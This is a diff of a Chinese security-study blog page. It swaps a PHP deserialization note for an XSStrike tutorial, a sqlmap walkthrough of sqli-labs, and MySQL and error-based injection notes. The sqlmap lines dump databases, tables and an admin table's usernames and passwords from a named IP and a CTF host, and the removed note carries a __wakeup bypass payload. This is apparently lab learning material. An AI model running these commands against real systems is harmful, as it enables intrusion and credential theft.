@@ -71,9 +71,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Web/注入漏洞/反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/工具使用/xsstrike/使用教程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -83,37 +83,161 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com"><a href="#魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com" class="headerlink" title="魔法方法php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)"></a>魔法方法<a target="_blank" rel="noopener" href="https://www.cnblogs.com/th0r/p/14071894.html#0x02-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95">php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)</a></h2><p>魔法方法指的是在php执行某个过程或函数时会调用的方法</p>
-<p>​<code>__construct()</code>​：在创建对象时候初始化对象，一般用于对变量赋初值（实例化对象时）。</p>
-<p>​<code>__destruct()</code>​： 和构造函数相反，当对象所在函数调用完毕后执行。（对象引用完成或对象被销毁反序列化之后）</p>
-<p>​<code>__toString()</code>​：当对象被当做一个字符串使用时调用。</p>
-<p>​<code>__invoke()</code>​：把对象当成函数调用</p>
-<p>​<code>__clone</code>​：当使用clone关键字拷贝完成一个对象</p>
-<p>​<code>__sleep()</code>​：序列化对象之前就调用此方法(其返回需要一个数组（序列化unserilize（）之前）</p>
-<p>​<code>__wakeup()</code>​：反序列化恢复对象之前调用该方法（反序列化unserilize（）之前）</p>
-<p>​<code>__call()</code>​：当调用对象中不存在的方法会自动调用该方法。  __callStatic():静态调用或调用成员常量时使用的方法不存在</p>
-<p>​<code>__get()</code>​：在调用私有属性（不存在）的时候会自动执行</p>
-<p>​<code>__set()</code>​：给不存在的成员属性赋值</p>
-<p>​<code>__isset()</code>​：在不可访问的属性上调用isset()或empty()触发</p>
-<p>​<code>__unset()</code>​：在不可访问的属性上使用unset()时触发</p>
-<h3 id="绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com"><a href="#绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com" class="headerlink" title="绕过 __wakeup​PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)"></a>绕过 <code>__wakeup</code>​<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14667?time__1311=mqmx9QDtDQ0QD=oDsdoYK0=9bkOQ=DcD3D&alichlgref=https://www.bing.com/">PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)</a></h3><p>当反序列化时, 给出的字段个数的数字小于提供的字段个数, 将不会执行 <code>__wakeup</code>​</p>
-<p>例如:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Dino&quot;:1:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;</span><br></pre></td></tr></table></figure>
+        <h1 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h1><h3 id="扫描单个网址"><a href="#扫描单个网址" class="headerlink" title="扫描单个网址"></a>扫描单个网址</h3><blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“</p>
+</blockquote>
+<h3 id="测试-URL-路径组件"><a href="#测试-URL-路径组件" class="headerlink" title="测试 URL 路径组件"></a>测试 URL 路径组件</h3><p>选项：–path</p>
+<p>在 URL 路径中注入有效负载</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/search/form/query">http://example.com/search/form/query</a>“ –path</p>
+</blockquote>
+<h3 id="将-POST-数据视为-JSON"><a href="#将-POST-数据视为-JSON" class="headerlink" title="将 POST 数据视为 JSON"></a>将 POST 数据视为 JSON</h3><p>选项：–json</p>
+<p>该开关可用于通过 POST 方法测试 JSON 数据</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/search.php">http://example.com/search.php</a>“ –data ‘{“q”:”query”}’ –json</p>
+</blockquote>
+<h3 id="爬行"><a href="#爬行" class="headerlink" title="爬行"></a>爬行</h3><p>选项：–crawl</p>
+<p>从目标网页开始抓取目标并进行测试</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –crawl</p>
+</blockquote>
+<p><img src="/.com//image-20250520022958-fyivqpz.png" alt="image"></p>
+<h3 id="爬行深度"><a href="#爬行深度" class="headerlink" title="爬行深度"></a>爬行深度</h3><p>选项：-l（默认为 2）</p>
+<p>此选项允许您指定爬网的深度</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –crawl -l 3</p>
+</blockquote>
+<h3 id="从文件中测试-抓取-URL"><a href="#从文件中测试-抓取-URL" class="headerlink" title="从文件中测试&#x2F;抓取 URL"></a>从文件中测试&#x2F;抓取 URL</h3><p>选项：–seeds</p>
+<blockquote>
+<p>python xsstrike.py –seeds urls.txt</p>
+<p>python xsstrike.py -u “<a href="http://example.com/">http://example.com</a>“ -l 3 –seeds urls.txt</p>
+</blockquote>
+<h3 id="从文件中暴力破解有效负载"><a href="#从文件中暴力破解有效负载" class="headerlink" title="从文件中暴力破解有效负载"></a>从文件中暴力破解有效负载</h3><p>选项：-f</p>
+<p>您可以从文件加载有效负载并检查它们是否有效</p>
+<blockquote>
+<p>python3 xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -f &#x2F;path&#x2F;to&#x2F;file.txt</p>
+</blockquote>
+<h3 id="线程数"><a href="#线程数" class="headerlink" title="线程数"></a>线程数</h3><p>选项：-t</p>
+<p>在爬行时可以向目标发出并发请求，并且-t可以使用选项来指定要发出的并发请求的数量。虽然线程可以帮助加快爬行速度，但它们也可能会触发安全机制。大量线程也会导致小型网站瘫痪</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/">http://example.com</a>“ -t 10 –crawl -l 3</p>
+</blockquote>
+<h3 id="暂停"><a href="#暂停" class="headerlink" title="暂停"></a>暂停</h3><p>选项：–timeout（默认为 7）</p>
+<p>可以指定在考虑 HTTP(S) 请求超时之前等待的秒数</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ –timeout=4</p>
+</blockquote>
+<h3 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h3><p>选项：-d</p>
+<p>可以指定每个 HTTP(S) 请求之间保持的秒数。有效值为 int，例如 1 表示秒</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -d 2</p>
+</blockquote>
+<h3 id="提供-HTTP-标头"><a href="#提供-HTTP-标头" class="headerlink" title="提供 HTTP 标头"></a>提供 HTTP 标头</h3><p>选项：–headers</p>
+<p>简单地从命令行添加标头，并用 \n 以下分隔符分隔</p>
+<blockquote>
+<p>python xsstrike.py -u <a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a> –headers “Accept-Language: en-US\nCookie: null”</p>
+</blockquote>
+<h3 id="盲目跨站"><a href="#盲目跨站" class="headerlink" title="盲目跨站"></a>盲目跨站</h3><p>选项：–blind</p>
+<p>在爬行时使用此选项将使 XSStrike 注入您定义的盲 XSS 有效负载 <code>core/config.py</code>​，以将其注入到每个 HTML 表单的每个参数中</p>
+<blockquote>
+<p>python xsstrike.py -u <a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a> –crawl –blind</p>
+</blockquote>
+<h3 id="有效负载编码"><a href="#有效负载编码" class="headerlink" title="有效负载编码"></a>有效负载编码</h3><p>选项：-e</p>
+<p>XSStrike 可以按需对有效负载进行编码。目前支持 base64 编码</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -e base64</p>
+</blockquote>
+<h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>选项：–fuzzer</p>
+<p>模糊器旨在测试过滤器和 Web 应用程序防火墙。它非常慢，因为它随机发送*延迟请求，并且延迟可能长达 30 秒。要最小化延迟，请使用<code>-d</code>​选项将延迟设置为 1 秒</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –fuzzer</p>
+</blockquote>
+<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>选项： –proxy（默认 0.0.0.0:8080）</p>
+<p>您必须设置您的代理（y|ies）core&#x2F;config.py，然后您可以–proxy随时使用开关来使用它们</p>
+<h3 id="跳过确认提示"><a href="#跳过确认提示" class="headerlink" title="跳过确认提示"></a>跳过确认提示</h3><p>选项：–skip</p>
+<p>如果您希望 XSStrike 在找到工作负载时继续扫描而不询问您是否要继续扫描，那么您可以使用此选项。它还会跳过 POC 生成</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –skip</p>
+</blockquote>
+<h3 id="跳过-DOM-扫描"><a href="#跳过-DOM-扫描" class="headerlink" title="跳过 DOM 扫描"></a>跳过 DOM 扫描</h3><p>选项：–skip-dom</p>
+<p>您可能希望在爬行时跳过 DOM XSS 扫描以节省时间</p>
+<blockquote>
+<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –skip-dom</p>
+</blockquote>
+<p><img src="/.com//image-20250520023134-ibwla1x.png" alt="image"></p>
 
-<p>改为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Dino&quot;:114514:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" data-id="cmaxy8gc2002kkg7k3cgybo1q" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
+
+
+  
+    <article id="post-Web/工具使用/sqlmap/sqlmap通关sqli-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="sqlmap通关sqli-labs"><a href="#sqlmap通关sqli-labs" class="headerlink" title="sqlmap通关sqli-labs"></a>sqlmap通关sqli-labs</h1><h2 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h2><blockquote>
+<p>&#x3D;&#x3D;获取用户：&#x3D;&#x3D;​<code>root@localhost</code>​</p>
+<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --current-user</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取当前数据库：&#x3D;&#x3D;</p>
+<p>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 --current-db</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取数据库：&#x3D;&#x3D;​<code>ctftraining</code>​</p>
+<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --dbs</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code></p>
+<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining --tables</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取所有字段&#x3D;&#x3D;获取admin表里的字段<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin --columns</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取字段值&#x3D;&#x3D;<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin -C Id,password,username --dump</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p>
+<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining -T flag --dump</code>​</p>
+</blockquote>
 <p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<h2 id="反序列化分隔符"><a href="#反序列化分隔符" class="headerlink" title="反序列化分隔符"></a>反序列化分隔符</h2><p>反序列化以;}结束，后面的字符串不影响正常的反序列化</p>
-<h2 id="属性逃逸"><a href="#属性逃逸" class="headerlink" title="属性逃逸"></a>属性逃逸</h2><p>般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸</p>
+<h2 id="POST型注入"><a href="#POST型注入" class="headerlink" title="POST型注入"></a>POST型注入</h2><blockquote>
+<p>使用BP抓包&#x3D;&#x3D;获取post报文&#x3D;&#x3D;，保存在&#x3D;&#x3D;txt文件&#x3D;&#x3D;里、&#x3D;&#x3D;-r代表文档&#x3D;&#x3D;，文档内容就是你的&#x3D;&#x3D;post报文&#x3D;&#x3D; –batch 自动选择yes、<br>获取到我们熟知的关键数据库：ctftraining</p>
+<p>​<code>sqlmap -r post_sqlmap.txt --batch -dbs</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code>​</p>
+<p>​<code>sqlmap -r 1.txt --batch -D ctftraining --tables</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p>
+<p>​<code>sqlmap -r 1.txt --batch -D ctftraining -T flag --dump</code>​</p>
+</blockquote>
 <p>‍</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cmawczpo5002jik7kh7g31po3" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/" data-id="cmaxy8gc2002lkg7kbdjv1y4h" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -215,7 +339,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/%E7%BB%95%E8%BF%87WAF/" data-id="cmawczpo6002kik7kc6no6ypt" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/%E7%BB%95%E8%BF%87WAF/" data-id="cmaxy8gc2002mkg7khw0wgeid" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -227,9 +351,9 @@
 
 
   
-    <article id="post-Web/工具使用/xsstrike/使用教程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/注入漏洞/SQL注入/Mysql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/Mysql/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -239,93 +363,301 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h1><h3 id="扫描单个网址"><a href="#扫描单个网址" class="headerlink" title="扫描单个网址"></a>扫描单个网址</h3><blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“</p>
-</blockquote>
-<h3 id="测试-URL-路径组件"><a href="#测试-URL-路径组件" class="headerlink" title="测试 URL 路径组件"></a>测试 URL 路径组件</h3><p>选项：–path</p>
-<p>在 URL 路径中注入有效负载</p>
+        <h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h1 id="Mysql学习"><a href="#Mysql学习" class="headerlink" title="Mysql学习"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45173404/article/details/115712758">Mysql学习</a></h1><h1 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h1><p><span data-type="text" style="color: var(--b3-font-color12);">SHOW DATABASES;</span></p>
+<p>‍</p>
+<h1 id="查看某一个数据库里所有的表"><a href="#查看某一个数据库里所有的表" class="headerlink" title="查看某一个数据库里所有的表"></a>查看某一个数据库里所有的表</h1><p><span data-type="text" style="color: var(--b3-font-color12);">USE databasename;</span></p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">USE mysql;</span></p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SHOW TABLES;</span></p>
+<p>‍</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SHOW TABLES FROM mysql;</span></p>
+<p>‍</p>
+<h1 id="select函数"><a href="#select函数" class="headerlink" title="select函数"></a>select函数</h1><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT NOW();</span>   – 查看当前时间</p>
+<p>‍</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">use information_schema;</span></p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT DATABASE</span></p>
+<p>‍</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT VERSION(); </span>– 查看版本</p>
+<p>‍</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT USER();</span> – 查看当前登录数据库的用户</p>
+<p>‍</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@datadir;</span> – 查看数据路径</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@basedir;</span> – 查看mysql安装路径</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@vesion_compile_os;</span> – 查看mysql安装的系统</p>
+<p>‍</p>
+<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM mysql.user;</span> – SELECT 查询关键字     #  ***** 代表所有</p>
+<p><span data-type="text" style="color: var(--b3-font-color8);">eg:</span> <span data-type="text" style="color: var(--b3-font-color9);">SELECT USER,HOST FROM mysql.user;</span></p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT schema_name FROM information_schema.’SCHEMATA’;</span></p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM information.tables;	</span></p>
+<h2 id="where-相当于编程语言里面的if"><a href="#where-相当于编程语言里面的if" class="headerlink" title="where 相当于编程语言里面的if"></a>where 相当于编程语言里面的if</h2><p><span data-type="text" style="color: var(--b3-font-color9);">SELECT USER,HOST FROM mysql.user WHERE USER &#x3D; ‘root’;</span> – mysql里面都是单引号</p>
+<h2 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h2><p><span data-type="text" style="color: var(--b3-font-color12);">CREATE DATABASE test CHARSET utf8mb4;</span></p>
+<h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><p>‍</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">CREATE TABLE t1(id INT);</span></p>
+<p>DROP TABLE t1;</p>
+<p>‍</p>
+<p>SHOW TABLES FROM test;</p>
+<p>ALTER TABLE t1 ADD NAME VARCHAR(32);</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">DESC t1;</span></p>
+<h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><p>INSERT INTO t1 VALUES (1,”张三”),(2,”李四”),(3,”王五”)</p>
+<p>SELECT * FROM t1;</p>
+<p>‍</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT DATABASE();</span></p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM information_schema.tables WHERE table_schema &#x3D;’test’;</span> – 传库名</p>
+<p>‍</p>
+<p>‍</p>
+<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM test.t1 WHERE NAME &#x3D; ‘张三’ AND id &#x3D; 1 ;</span></p>
+<p>‍</p>
+<h2 id="union"><a href="#union" class="headerlink" title="union"></a>union</h2><p>SELECT * FROM test.t1 UNION SELECT 1,2,3,4,5;</p>
+<p>SELECT USER,HOST FROM mysql.user UNION SELECT * FROM test.’t1’;</p>
+<p>‍</p>
+<p>（rand：生成0~1的随机数 floor向下取整）</p>
+<p>select * from users group by name;(将相同名字的分层一个组)</p>
+<p>select name,count(*) from users group by name;</p>
+<p>在执行 group by name 语句时，MySQL 会在内部建立一个虚拟表，用来储存列的数据，表中会有一个 group 的 key 值作为表的主键，这里的主键就是用来分类的name列中获取的数据，当查询数据时，读取数据库数据，然后查看虚拟表中是否存在，不存在则插入新纪录，当读取到第一行数据时，发现name字段的admin不存在，将admin放入主键列中，1放在id列中;然后指针下移，继续读取数据表中的数据，读到第三行的 name 字段为 admin数据时，发现 admin 在虚拟表中已经存在，就汇总在一起，虚拟表如下如此循环，查询完所有的表后，虚拟表为如下所示，但是显示的结果在数据库中如下，因为以 name 分组，id 值取最前面一个，形成结果数据表显示出来</p>
+<p>select name,id from users group by name; 只取第一个出来</p>
+<p>当我们加上count(<em>)函数时，操作过程为:查看虚拟表是否存在该主键值，不存在则插入新记录，存在则count(</em>)字段直接加1，这样就能对上面的分类结果进行统计，然后将统计结果返回:</p>
+<p>select id,name,concat((select database()),0x7e,floor(rand(0)*2)) as a from users;</p>
+<p>select count(*),concat((select database()),0x7e,floor(rand(0)*2)) as a from users group by a ; **(此时group by的对象是a，a&#x3D;concat((select database()),0x7e,floor(rand(0)<em>2)),as a的意思也就是把前面的当作a为一个别名)</em>*</p>
 <blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search/form/query">http://example.com/search/form/query</a>“ –path</p>
+<p>第一次:<br>1:先查询虚拟表 有无a数据，比如第一次査询时为a&#x3D;sqli<del>0(也有可能是其他值)<br>2:查询无对应的数据，执行插入操作，插入时该语句再次执行，比如此时a&#x3D;sqli</del>0(也有可能是其他值)</p>
 </blockquote>
-<h3 id="将-POST-数据视为-JSON"><a href="#将-POST-数据视为-JSON" class="headerlink" title="将 POST 数据视为 JSON"></a>将 POST 数据视为 JSON</h3><p>选项：–json</p>
-<p>该开关可用于通过 POST 方法测试 JSON 数据</p>
 <blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php">http://example.com/search.php</a>“ –data ‘{“q”:”query”}’ –json</p>
+<p>第二次:<br>1.先查询虚拟表 有无a数据，比如第二次查询时还是a&#x3D;sqli~01:<br>2:查询无对应的数据，执行插入操作，插入时该语句再次执行，比如插入时，此时a&#x3D;sqli-0，执行insert操作就会报错，因为key主键对应的列内容不允许重复</p>
 </blockquote>
-<h3 id="爬行"><a href="#爬行" class="headerlink" title="爬行"></a>爬行</h3><p>选项：–crawl</p>
-<p>从目标网页开始抓取目标并进行测试</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –crawl</p>
-</blockquote>
-<p><img src="/.com//image-20250520022958-fyivqpz.png" alt="image"></p>
-<h3 id="爬行深度"><a href="#爬行深度" class="headerlink" title="爬行深度"></a>爬行深度</h3><p>选项：-l（默认为 2）</p>
-<p>此选项允许您指定爬网的深度</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –crawl -l 3</p>
-</blockquote>
-<h3 id="从文件中测试-抓取-URL"><a href="#从文件中测试-抓取-URL" class="headerlink" title="从文件中测试&#x2F;抓取 URL"></a>从文件中测试&#x2F;抓取 URL</h3><p>选项：–seeds</p>
-<blockquote>
-<p>python xsstrike.py –seeds urls.txt</p>
-<p>python xsstrike.py -u “<a href="http://example.com/">http://example.com</a>“ -l 3 –seeds urls.txt</p>
-</blockquote>
-<h3 id="从文件中暴力破解有效负载"><a href="#从文件中暴力破解有效负载" class="headerlink" title="从文件中暴力破解有效负载"></a>从文件中暴力破解有效负载</h3><p>选项：-f</p>
-<p>您可以从文件加载有效负载并检查它们是否有效</p>
-<blockquote>
-<p>python3 xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -f &#x2F;path&#x2F;to&#x2F;file.txt</p>
-</blockquote>
-<h3 id="线程数"><a href="#线程数" class="headerlink" title="线程数"></a>线程数</h3><p>选项：-t</p>
-<p>在爬行时可以向目标发出并发请求，并且-t可以使用选项来指定要发出的并发请求的数量。虽然线程可以帮助加快爬行速度，但它们也可能会触发安全机制。大量线程也会导致小型网站瘫痪</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/">http://example.com</a>“ -t 10 –crawl -l 3</p>
-</blockquote>
-<h3 id="暂停"><a href="#暂停" class="headerlink" title="暂停"></a>暂停</h3><p>选项：–timeout（默认为 7）</p>
-<p>可以指定在考虑 HTTP(S) 请求超时之前等待的秒数</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ –timeout=4</p>
-</blockquote>
-<h3 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h3><p>选项：-d</p>
-<p>可以指定每个 HTTP(S) 请求之间保持的秒数。有效值为 int，例如 1 表示秒</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -d 2</p>
-</blockquote>
-<h3 id="提供-HTTP-标头"><a href="#提供-HTTP-标头" class="headerlink" title="提供 HTTP 标头"></a>提供 HTTP 标头</h3><p>选项：–headers</p>
-<p>简单地从命令行添加标头，并用 \n 以下分隔符分隔</p>
-<blockquote>
-<p>python xsstrike.py -u <a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a> –headers “Accept-Language: en-US\nCookie: null”</p>
-</blockquote>
-<h3 id="盲目跨站"><a href="#盲目跨站" class="headerlink" title="盲目跨站"></a>盲目跨站</h3><p>选项：–blind</p>
-<p>在爬行时使用此选项将使 XSStrike 注入您定义的盲 XSS 有效负载 <code>core/config.py</code>​，以将其注入到每个 HTML 表单的每个参数中</p>
-<blockquote>
-<p>python xsstrike.py -u <a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a> –crawl –blind</p>
-</blockquote>
-<h3 id="有效负载编码"><a href="#有效负载编码" class="headerlink" title="有效负载编码"></a>有效负载编码</h3><p>选项：-e</p>
-<p>XSStrike 可以按需对有效负载进行编码。目前支持 base64 编码</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -e base64</p>
-</blockquote>
-<h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>选项：–fuzzer</p>
-<p>模糊器旨在测试过滤器和 Web 应用程序防火墙。它非常慢，因为它随机发送*延迟请求，并且延迟可能长达 30 秒。要最小化延迟，请使用<code>-d</code>​选项将延迟设置为 1 秒</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –fuzzer</p>
-</blockquote>
-<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>选项： –proxy（默认 0.0.0.0:8080）</p>
-<p>您必须设置您的代理（y|ies）core&#x2F;config.py，然后您可以–proxy随时使用开关来使用它们</p>
-<h3 id="跳过确认提示"><a href="#跳过确认提示" class="headerlink" title="跳过确认提示"></a>跳过确认提示</h3><p>选项：–skip</p>
